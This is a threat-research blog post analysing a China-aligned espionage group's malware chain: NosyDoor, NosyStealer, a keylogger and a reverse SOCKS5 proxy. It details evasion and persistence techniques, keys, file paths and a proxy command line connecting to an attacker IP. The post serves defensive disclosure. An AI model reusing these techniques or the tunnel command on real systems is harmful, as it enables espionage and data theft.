                    <div class="article-body">
    <p>In 2024, ESET researchers noticed previously undocumented malware in the network of a Southeast Asian governmental entity. This led us to uncover even more new malware on the same system, none of which had substantial ties to any previously tracked threat actors. Based on our findings, we decided to attribute the malicious tools to a new China-aligned APT group that we have named LongNosedGoblin.</p>
<p>The group employs a varied custom toolset consisting mainly of C#/.NET applications, and, notably, uses Group Policy to deploy its malware and move laterally across the systems of targeted entities. This blogpost details our discovery of LongNosedGoblin, goes over its known campaigns, and dives into the toolset of the group.</p>
<blockquote>
<div><strong>Key points of the report:</strong></div>
<ul>
<li>LongNosedGoblin is a newly discovered China-aligned APT group targeting governmental entities in Southeast Asia and Japan, with the goal of cyberespionage.</li>
<li>The group has been active since at least September 2023.</li>
<li>LongNosedGoblin uses Group Policy to deploy malware across the compromised network, and cloud services (e.g., Microsoft OneDrive and Google Drive) as command and control (C&amp;C) servers.</li>
<li>One of the group&rsquo;s tools, NosyHistorian, is used to gather browser history and decide where to deploy further malware, such as the NosyDoor backdoor.</li>
<li>NosyDoor is most likely being shared by multiple China-aligned threat actors.</li>
<li>We provide a detailed analysis of NosyHistorian, NosyDoor, NosyStealer, NosyDownloader, NosyLogger, and other tools used by LongNosedGoblin.</li>
</ul>
</blockquote>
<h2>Smells like trouble: Introducing LongNosedGoblin</h2>
<p>LongNosedGoblin is a China-aligned APT group that targets governmental entities in Southeast Asia and Japan, with the goal of conducting cyberespionage. As we already mentioned: in its campaigns, LongNosedGoblin abuses <a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/group-policy/group-policy-overview" target="_blank" rel="noopener">Group Policy</a> &ndash; a mechanism for managing settings and permissions on Windows machines, typically used with Active Directory &ndash; to deploy malware and move laterally across the compromised network.</p>
<p>One of the main tools in its arsenal is NosyHistorian, a C#/.NET application that the group uses to collect browser history, which is then used to determine where to deploy further malware. This includes another major LongNosedGoblin tool, a backdoor that we named NosyDoor, which, in campaigns we observed, used Microsoft OneDrive as its C&amp;C server. NosyDoor also employs living-off-the-land techniques in its execution chain, namely <a href="https://attack.mitre.org/techniques/T1574/014/" target="_blank" rel="noopener">AppDomainManager injection</a>. Finally, several of the group&rsquo;s tools can bypass the <a href="https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal" target="_blank" rel="noopener">Antimalware Scan Interface</a> (AMSI), which enables antimalware products to scan various scripts before execution.</p>
<h3>Discovery</h3>
<p>In February 2024, we found unknown malware on a system of a governmental entity in Southeast Asia. The malware was used to drop a custom backdoor, which we later named NosyDoor. At the same time, we noticed that the compromise involved not just one, but multiple machines from the same entity, with the malware having been deployed via Group Policy.</p>
<p>Additional analysis revealed that the same victims were also afflicted with a different malicious tool distributed via Group Policy, this one used for collecting browser history. We named the tool NosyHistorian. While we found many victims affected by NosyHistorian in the course of our original investigation between January and March 2024, only a small subset of them were compromised by NosyDoor. Some samples of NosyDoor&rsquo;s dropper even contained execution guardrails to limit operation to specific victims&rsquo; machines.</p>
<p>Later, we identified even more unknown malware on the victims&rsquo; machines: NosyStealer, which exfiltrates browser data; NosyDownloader, which downloads and runs a payload in memory; NosyLogger, a keylogger; other tools like a reverse SOCKS5 proxy; and an argument runner (a tool that runs an application passed as an argument) that was used to run a video recorder, likely <a href="https://ffmpeg.org/">FFmpeg</a>, to capture audio and video. The downloader was first recorded in our telemetry as far back as September 2023.</p>
<h3>Attribution</h3>
<p>Due to the unique toolset, alongside the use of Group Policy for lateral movement, we decided to attribute the attacks to a new China-aligned APT group, and named it LongNosedGoblin. We noticed some overlap in the file paths mentioned in a <a href="https://securelist.com/toddycat-traffic-tunneling-data-extraction-tools/112443/" target="_blank" rel="noopener">Kaspersky blogpost about ToddyCat activity</a>, an APT group with similar <a href="https://securelist.com/toddycat/106799/" target="_blank" rel="noopener">targeting</a>, but the malware in that report lacks code similarity with the malware considered here.</p>
<p>It should also be noted that in June 2025, the Russian cybersecurity company Solar published a <a href="https://web.archive.org/web/20250803114940/https:/rt-solar.ru/solar-4rays/blog/5603/" target="_blank" rel="noopener">blogpost</a> on an APT group it refers to as Erudite Mogwai, which used a payload that closely resembles LongNosedGoblin&rsquo;s NosyDoor. According to the authors, Erudite Mogwai targeted the IT infrastructure of a Russian government organization and Russian IT companies, using the LuckyStrike Agent backdoor in its operations.</p>
<p>However, we cannot confirm that Erudite Mogwai and LongNosedGoblin are one and the same, as there is a definite difference in TTPs between the two groups. Notably, the Erudite Mogwai research does not mention the abuse of Active Directory Group Policy for malware deployment &ndash; a technique that is quite specific to LongNosedGoblin&rsquo;s operations.</p>
<p>We later identified another instance of a NosyDoor variant targeting an organization in an EU country, once again employing different TTPs, and using the Yandex Disk cloud service as a C&amp;C server. The use of this NosyDoor variant suggests that the malware may be shared among multiple China-aligned threat groups. This is further corroborated by Solar&rsquo;s observation of the word <span style="font-family: courier new, courier, monospace;">Paid</span> in the PDB path of NosyDoor, suggesting that the malware may be commercially provided as a service &ndash; potentially indicating it is being sold or licensed to other threat actors.</p>
<h3>Later campaigns</h3>
<p>Throughout 2024, LongNosedGoblin was actively deploying NosyDownloader in Southeast Asia. In December of the same year, we detected an updated version of NosyHistorian in Japan, but then observed no subsequent activity.</p>
<p>In September 2025, we began seeing renewed activity of the group in Southeast Asia. As in previous campaigns, the threat actor leveraged Group Policy to deliver NosyHistorian to targeted machines.</p>
<p>During this wave of attacks, we noticed behavior consistent with <a href="https://attack.mitre.org/software/S0154/" target="_blank" rel="noopener">Cobalt Strike</a> usage: a loader named <span style="font-family: courier new, courier, monospace;">oci.dll</span> was downloaded on a single machine, with a payload named <span style="font-family: courier new, courier, monospace;">ocapi.edb</span> loaded from disk. LongNosedGoblin then subsequently deployed the potential Cobalt Strike loader to selected machines via Group Policy.</p>
<p>Additionally, we saw that another similar component, <span style="font-family: courier new, courier, monospace;">mscorsvc.dll</span>, was downloaded, with its payload stored in <span style="font-family: courier new, courier, monospace;">conf.ini</span>. This loader was then deployed to victims&rsquo; machines using Group Policy, employing the same delivery mechanism as <span style="font-family: courier new, courier, monospace;">oci.dll</span>.</p>
<h2>Nosing around: LongNosedGoblin&rsquo;s toolset</h2>
<h3>NosyHistorian</h3>
<p>NosyHistorian is a C#/.NET application with a self-explanatory internal name <span style="font-family: courier new, courier, monospace;">GetBrowserHistory</span>, as it, indeed, collects browser history. In the observed campaigns, the attackers used this tool to gain insight about the machines in the compromised infrastructure. Based on this information, they picked a small subset of specific victims to compromise further with their NosyDoor backdoor.</p>
<p>We saw the tool being deployed via Group Policy under the filename <span style="font-family: courier new, courier, monospace;">History.ini</span>, disguising the file as an INI file. <p>NosyHistorian iterates over all users on the machine and retrieves the browser history from Google Chrome, Microsoft Edge, and Mozilla Firefox. <h3>NosyDoor</h3>
<p>As stated previously, the NosyDoor backdoor uses cloud services, such as Microsoft OneDrive, for its C&amp;C server. The malware has a fairly straightforward, three-stage chain of execution, depicted in Figure&nbsp;1. The first stage is a dropper that deploys the second stage, which involves a living-off-the-land attack using the <a href="https://attack.mitre.org/techniques/T1574/014/">AppDomainManager injection technique</a>, which is in turn used to execute the final payload, the backdoor itself.</p>
<p>NosyDoor collects metadata about the victim&rsquo;s machine, including the machine name, username, the OS version, and the name of the current process, and sends it all to the C&amp;C. It then retrieves and parses task files with commands from the C&amp;C. The commands allow it to exfiltrate files, delete files, and execute shell commands, among other things.</p>
<figure class="image"><img title="Figure 1. NosyDoor execution chain" src="https://web-assets.esetstatic.com/wls/2025/12-25/longnosedgoblin/figure-1-1.png" alt="Figure 1. NosyDoor execution chain 1" width="" height="" />
<figcaption><em>Figure 1. NosyDoor execution chain</em></figcaption>
</figure>
<h4>NosyDoor Stage 1 &ndash; dropper</h4>
<p>The malware&rsquo;s first stage is a dropper, specifically a C#/.NET application with the internal name <span style="font-family: courier new, courier, monospace;">OneClickOperation</span>. Same as NosyHistorian, it is deployed via Group Policy. We have seen the dropper masquerade as a <a href="https://learn.microsoft.com/en-us/previous-versions/windows/desktop/policy/registry-policy-file-format" target="_blank" rel="noopener">Registry Policy file</a> by using the filename <span style="font-family: courier new, courier, monospace;">Registry.pol</span>, although we also observed <span style="font-family: courier new, courier, monospace;">Registry.plo</span>, which is uncommon (it could be a typo, or maybe the threat actors did not want the filename to conflict with another malicious file).</p>
<p>The dropper base64 decodes embedded files and decrypts them via Data Encryption Standard (DES) with both key and initialization vector set to <span style="font-family: courier new, courier, monospace;">UevAppMo</span> (the first eight bytes of the string <span style="font-family: courier new, courier, monospace;">UevAppMonitor</span>), then drops them to <span style="font-family: courier new, courier, monospace;">C:\Windows\Microsoft.NET\Framework</span> with the following filenames:</p>
<ul>
<li><span style="font-family: courier new, courier, monospace;">SharedReg.dll</span></li>
<li><span style="font-family: courier new, courier, monospace;">log.cached</span></li>
<li><span style="font-family: courier new, courier, monospace;">netfxsbs9.hkf</span></li>
<li><span style="font-family: courier new, courier, monospace;">UevAppMonitor.exe.config</span></li>
</ul>
<p>These filenames have been chosen deliberately to blend in with existing files, since the directory normally contains files named <span style="font-family: courier new, courier, monospace;">SharedReg12.dll</span> and <span style="font-family: courier new, courier, monospace;">netfxsbs12.hkf</span>.</p>
<p>In its final steps, the dropper creates and starts a Windows scheduled task with the name <span style="font-family: courier new, courier, monospace;">OneDrive Reporting Task-S-1-5-21-&lt;GUID&gt;</span> under the Microsoft task folder, where <span style="font-family: courier new, courier, monospace;">&lt;GUID&gt;</span> is a random GUID string. The scheduled task is responsible for executing the legitimate <span style="font-family: courier new, courier, monospace;">UevAppMonitor.exe</span> in the <span style="font-family: courier new, courier, monospace;">C:\Windows\Microsoft.NET\Framework</span> directory during system startup. The dropper copies the legitimate file from <span style="font-family: courier new, courier, monospace;">C:\Windows\System32\</span> to the new location.</p>
<p>The newer samples also include an execution guardrail that makes the dropper function only on victims&rsquo; computers with a specific machine name (see Figure&nbsp;2).</p>
<figure class="image"><img title="Figure 2. Dropper code with execution guardrails" src="https://web-assets.esetstatic.com/wls/2025/12-25/longnosedgoblin/figure-2.png" alt="Figure 2. Dropper code" width="" height="" />
<figcaption><em>Figure 2. Dropper code with execution guardrails</em></figcaption>
</figure>
<h4>NosyDoor Stage 2 &ndash; AppDomainManager injection<a id="NosyDoor Stage 2 &ndash; AppDomainManager injection"></a></h4>
<p><span style="font-family: courier new, courier, monospace;">UevAppMonitor.exe</span> is a legitimate C#/.NET application, which the malware copied from the <span style="font-family: courier new, courier, monospace;">C:\Windows\System32\</span> to the <span style="font-family: courier new, courier, monospace;">C:\Windows\Microsoft.NET\Framework</span> directory and used as a living-off-the-land binary, or <a href="https://lolbas-project.github.io/" target="_blank" rel="noopener">LOLBin</a>. Living-off-the-land attacks abuse legitimate tools already present on the system. In this case, the application is used to trigger <a href="https://web.archive.org/web/20250330053546/https:/www.rapid7.com/blog/post/2023/05/05/appdomain-manager-injection-new-techniques-for-red-teams/" target="_blank" rel="noopener">AppDomainManager injection</a> via a configuration file. This technique can make applications built in the .NET framework load malicious code instead of the intended legitimate code by making use of the AppDomainManager class.</p>
<p>When the application is executed, it loads the configuration file shown in Figure&nbsp;3, which makes the application call the <span style="font-family: courier new, courier, monospace;">InitializeNewDomain</span> method of the custom <span style="font-family: courier new, courier, monospace;">SharedReg</span> class in <span style="font-family: courier new, courier, monospace;">SharedReg.dll</span>. The configuration also sets the <a href="https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/etwenable-element" target="_blank" rel="noopener">&lt;etwEnable&gt; element&rsquo;s</a> <span style="font-family: courier new, courier, monospace;">enabled</span> attribute to <span style="font-family: courier new, courier, monospace;">false</span> so that event tracing for Windows is disabled.</p>
<figure class="image"><img title="Figure 3. Content of UevAppMonitor.exe.config with specified AppDomainManager" src="https://web-assets.esetstatic.com/wls/2025/12-25/longnosedgoblin/figure-3.png" alt="Figure 3. Content of UevAppMonitor.exe.config with specified AppDomainManager" width="" height="" />
<figcaption><em>Figure 3. Content of </em><span style="font-family: courier new, courier, monospace;">UevAppMonitor.exe</span><em>.config with specified AppDomainManager</em></figcaption>
</figure>
<p><span style="font-family: courier new, courier, monospace;">SharedReg.dll</span> contains code to bypass <a href="https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal" target="_blank" rel="noopener">AMSI</a>, from an open-source AV/EDR evasion framework called <a href="https://github.com/klezVirus/inceptor" target="_blank" rel="noopener">inceptor</a>. Other than that, it base64 decodes the file <span style="font-family: courier new, courier, monospace;">netfxsbs9.hkf</span>, decrypts the result via AES with key <span style="font-family: courier new, courier, monospace;">UevAppMonitor</span>, padded with null bytes until its length is 16, initialization vector <span style="font-family: courier new, courier, monospace;">0</span>, and eventually base64 decodes the result again. The result is NosyDoor, which is then executed. Any errors are written to the file <span style="font-family: courier new, courier, monospace;">error.txt</span> in the <span style="font-family: courier new, courier, monospace;">C:\Windows\Microsoft.NET\Framework</span> directory.</p>
<h4>NosyDoor Stage 3 &ndash; payload</h4>
<p>NosyDoor&rsquo;s third stage, the main payload, is a C#/.NET backdoor with the internal name OneDrive and with PDB path <span style="font-family: courier new, courier, monospace;">E:\Csharp\Thomas\Server\ThomasOneDrive\obj\Release\OneDrive.pdb</span>. As this name suggests, the backdoor uses cloud services, in this case Microsoft OneDrive, as a C&amp;C server.</p>
<p>The full list of metadata the backdoor collects consists of the following:</p>
<ul>
<li>external IPv4 address,</li>
<li>local IPv4 address,</li>
<li>agent ID,</li>
<li>username,</li>
<li>machine name,</li>
<li>current directory,</li>
<li>current process (name, ID, architecture),</li>
<li>stage 3 local start time,</li>
<li>current local time,</li>
<li>OS version,</li>
<li><span style="font-family: courier new, courier, monospace;">CodeType</span> (see Table 3), and</li>
<li><span style="font-family: courier new, courier, monospace;">AgentType</span> (see Table 3).</li>
</ul>
<p>All collected metadata is encrypted via RSA and then uploaded to OneDrive as the file <span style="font-family: courier new, courier, monospace;">Read_&lt;agent_id&gt;.max</span>. Once NosyDoor sends the metadata, it looks for commands from the C&amp;C in task files with <span style="font-family: courier new, courier, monospace;">.max</span> extensions in the following directory:</p>
<p><span style="font-family: courier new, courier, monospace;">&lt;FolderName&gt;-&lt;ListenerID&gt;/&lt;agent_id&gt;/&lt;Payload.TaskFolderName&gt;</span></p>
<p>Each task file contains an encrypted command, which is encapsulated with values taken from the backdoor&rsquo;s configuration:</p>
<p><span style="font-family: courier new, courier, monospace;">&lt;Payload.Prepend&gt;&lt;Payload.PayloadPrepend&gt;<span style="font-family: 'Courier New', Courier, monospace; background-color: #0096a1; color: white;">&lt;encrypted_command&gt;</span><span style="font-family: courier new, courier, monospace;">&lt;Payload.PayloadAppend&gt;&lt;Payload.Append&gt;</span></span></p>

<h4>NosyStealer Stage 1 &ndash; DLL loader</h4>
<p>The first stage (<span style="font-family: courier new, courier, monospace;">pmp.exe</span>) in the NosyStealer chain is a C/C++ application. The observed sample simply loads a library named <span style="font-family: courier new, courier, monospace;">SERV.dll</span> from disk and calls the exported function <span style="font-family: courier new, courier, monospace;">Hello</span>.</p>
<h4>NosyStealer Stage 2 &ndash; injector<a id="NosyStealer Stage 2 &ndash; injector"></a></h4>
<p>We observed two NosyStealer Stage 2 samples &ndash; one (<span style="font-family: courier new, courier, monospace;">SERV.dll</span>) in our telemetry, and the other (<span style="font-family: courier new, courier, monospace;">msi.dll</span>) uploaded to <a href="https://www.virustotal.com/gui/file/5959d4414cc6764212679eec7c9ed5911eed6d24f310bc7b9ba570e11b84be8f">VirusTotal</a> from Malaysia. Neither has the exported function <span style="font-family: courier new, courier, monospace;">Hello</span> but both have the main code in <span style="font-family: courier new, courier, monospace;">DllMain</span>, i.e., the malicious code is run right after the DLL is loaded. They have the following exports:</p>
<ul>
<li><span style="font-family: courier new, courier, monospace;">??0Cv2dllnoinject@@QEAA@XZ</span></li>
<li><span style="font-family: courier new, courier, monospace;">??4Cv2dllnoinject@@QEAAAEAV0@$$QEAV0@@Z</span></li>
<li><span style="font-family: courier new, courier, monospace;">??4Cv2dllnoinject@@QEAAAEAV0@AEBV0@@Z</span></li>
<li><span style="font-family: courier new, courier, monospace;">?fnv2dllnoinject@@YAHXZ</span></li>
<li><span style="font-family: courier new, courier, monospace;">?nv2dllnoinject@@3HA</span></li>

<p>The next-stage data is loaded from the hardcoded path <span style="font-family: courier new, courier, monospace;">C:\ProgramData\Microsoft\WDF\MDE.dat</span>. It is decrypted via a single-byte XOR cipher with key <span style="font-family: courier new, courier, monospace;">0x7A</span>. The result is <a href="https://github.com/TheWover/donut">Donut</a> shellcode that is injected into the running <span style="font-family: courier new, courier, monospace;">pmp.exe</span> process (NosyStealer Stage 1) using the <span style="font-family: courier new, courier, monospace;">CreateRemoteThread</span> API in the <span style="font-family: courier new, courier, monospace;">SERV.dll</span> case, and into a newly created <span style="font-family: courier new, courier, monospace;">notepad.exe</span> process using the <span style="font-family: courier new, courier, monospace;">SetThreadContext</span> API in the <span style="font-family: courier new, courier, monospace;">msi.dll</span> case.</p>
<h4>NosyStealer Stage 3 &ndash; loader<a id="NosyStealer Stage 3 &ndash; loader"></a></h4>
<p>As mentioned in the <em><a href="#NosyStealer Stage 2 &ndash; injector">NosyStealer Stage 2 &ndash; injector</a> </em>section, this stage is shellcode containing an embedded PE file that is decrypted, loaded, and executed in memory using Donut&rsquo;s reflective loader. The extracted binary is a C/C++ application.</p>
<p>Like <em><a href="#NosyDoor Stage 2 &ndash; AppDomainManager injection">NosyDoor Stage 2 &ndash; AppDomainManager injection</a></em>, this stage uses a known technique to bypass AMSI. It patches the <span style="font-family: courier new, courier, monospace;">AmsiScanBuffer</span> function in the loaded <span style="font-family: courier new, courier, monospace;">amsi.dll</span> with code that returns <span style="font-family: courier new, courier, monospace;">E_INVALIDARG</span> (see Figure&nbsp;6).</p>
<figure class="image"><img title="Figure 6. Hex-Rays decompiled code that patches AmsiScanBuffer" src="https://web-assets.esetstatic.com/wls/2025/12-25/longnosedgoblin/figure-6.png" alt="Figure 6. Hex-Rays decompiled code that patches AmsiScanBuffer" width="" height="" />

<p>Then it creates a Windows scheduled task with the name Daily Check Task that runs <span style="font-family: courier new, courier, monospace;">C:\ProgramData\Microsoft\WDF\pmp.exe</span> (NosyStealer Stage 1) every day with permissions of the local system account.</p>
<p>After patching the AMSI function and persisting, it continues similarly to the previous stage &ndash; it decrypts the next stage from the hardcoded path <span style="font-family: courier new, courier, monospace;">C:\ProgramData\Microsoft\WDF\mfd.dat</span> via a single-byte XOR cipher with key <span style="font-family: courier new, courier, monospace;">0x7A</span>, where the resulting blob is another Donut shellcode, which is then executed.</p>
<h4>NosyStealer Stage 4 &ndash; payload</h4>
<p>Again, like <em><a href="#NosyStealer Stage 3 &ndash; loader">NosyStealer Stage 3 &ndash; loader</a>,</em> this stage is shellcode that decrypts, loads, and executes an embedded PE file in memory using Donut&rsquo;s reflective loader. This time, the extracted binary is a Go application that steals browser data from the Microsoft Edge and Google Chrome web browsers. To do so, it downloads a file named <span style="font-family: courier new, courier, monospace;">config</span> from Google Docs. When the file contains a victim&rsquo;s ID, NosyStealer reads Microsoft Edge and Google Chrome profile data, archives it with tar, and encrypts it with a custom cipher.</p>
<p>NosyStealer then exfiltrates the encrypted tar archive to Google Drive. Figure&nbsp;7 is an example of the JSON-formatted configuration, embedded in the binary, required to access Google Drive and Google Docs.</p>

<h3>NosyDownloader</h3>
<p>Analyzing ESET telemetry data, we also found in the networks compromised by LongNosedGoblin various originally benign applications that had been patched with malicious code. Every subsequent stage is encoded with base64, where the last one is additionally deflated with gzip.</p>

<h3>NosyLogger</h3>
<p>We also identified a C#/.NET keylogger that we named NosyLogger. It seems to be a modified version of the open-source keylogger <a href="https://github.com/zorggomat/DuckSharp" target="_blank" rel="noopener">DuckSharp</a>, with the main differences being that it doesn&rsquo;t send emails or translate logged keys into the Cyrillic alphabet.</p>
<p>The malware initially checks whether a debugger is present via the <span style="font-family: courier new, courier, monospace;">IsDebuggerPresent</span> and <span style="font-family: courier new, courier, monospace;">CheckRemoteDebuggerPresent</span> APIs; if not, it begins its keylogging functionality.</p>
<p>Window name, pressed keys, and pasted clipboard content are accumulated in memory. NosyLogger encrypts these data batches using AES with the key <span style="font-family: courier new, courier, monospace;">D53FCC01038E20193FBD51B7400075CF7C9C4402B73DA7B0DB836B000EBD8B1C</span> and a <a href="https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.symmetricalgorithm.generateiv" target="_blank" rel="noopener">randomly generated</a> initialization vector of fixed length, where the vector is appended to the encrypted batch of data. The encrypted data batch is then appended to the file at the hardcoded location <span style="font-family: courier new, courier, monospace;">C:\Windows\Temp\TS_D418.tmp</span> in hexadecimal string format. In that file, each encrypted data batch is separated by a newline followed by the string <span style="font-family: courier new, courier, monospace;">ENDBLOCK</span>. This process of encrypting and storing accumulated data to the file takes place every 10 seconds. This file is not exfiltrated by NosyLogger.</p>
<h3>Other deployed tools</h3>
<h4>ReverseSocks5</h4>
<p>Among other malware deployed by LongNosedGoblin, we found an open-source reverse SOCKS5 proxy, written in Go, called <a href="https://github.com/Acebond/ReverseSocks5" target="_blank" rel="noopener">ReverseSocks5</a>. We discovered it when we noticed the following command line arguments being used:</p>
<p><span style="font-family: courier new, courier, monospace;">-connect 118.107.234[.]29:8080 -psk "58fi04qQ" /F</span></p>
<p>The option <span style="font-family: courier new, courier, monospace;">-psk</span> is used to set a preshared key for encryption and authentication. The argument <span style="font-family: courier new, courier, monospace;">/F</span> is not handled by ReverseSocks5 and is probably unintentional; this argument is commonly used with <a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create" target="_blank" rel="noopener">schtasks create</a>.</p>
<p>We then noticed another set of command line arguments (which do not have the <span style="font-family: courier new, courier, monospace;">/F</span> argument anymore):</p>
<p><span style="font-family: courier new, courier, monospace;">-connect 118.107.234[.]29:8080 -psk "15Kaf22N3b"</span></p>
<p>This second set corresponds to execution of ReverseSocks5, where we observed PowerShell as the parent process. NosyDownloader was also executed during this time, indicating that the sample was probably deployed with it.</p>
<h4>Argument runner</h4>
<p>This is a C#/.NET application with internal name <span style="font-family: courier new, courier, monospace;">Binary</span>; the sole purpose of this tool is to run an application passed as an argument. We saw the filename <span style="font-family: courier new, courier, monospace;">TCOEdge.exe</span> as part of the command line along with arguments that are specific to the <a href="https://ffmpeg.org/" target="_blank" rel="noopener">FFmpeg</a> multimedia framework; it was used to record the screen and capture audio, saving it to <span style="font-family: courier new, courier, monospace;">C:\Windows\Temp\output.avi</span>.</p>
<h2>Conclusion</h2>
<p>LongNosedGoblin is a China-aligned APT group that targets governmental entities in Southeast Asia and Japan. Our analysis of its campaigns revealed numerous pieces of custom malware, which the group uses to conduct cyberespionage against its victims. Notably, LongNosedGoblin employs Group Policy to perform lateral movement within the compromised network.</p>
